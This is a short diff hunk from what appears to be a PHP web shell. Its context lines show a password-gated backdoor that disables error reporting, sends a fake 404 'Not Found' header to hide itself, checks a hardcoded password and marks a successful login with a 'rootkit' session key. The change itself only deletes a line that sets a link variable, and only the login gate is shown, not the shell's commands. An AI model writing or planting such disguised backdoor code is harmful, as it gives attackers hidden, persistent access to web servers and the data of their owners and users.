@@ -6,7 +6,6 @@ error_reporting(0);
 header('HTTP/1.0 404 Not Found', true, 404);
 session_start();
 $pass = "jancok";
-$link = "s.txt";
 if($_POST['passwd'] == $pass) {
   $_SESSION['rootkit'] = $pass;
   echo "<script>window.location='?'</script>";
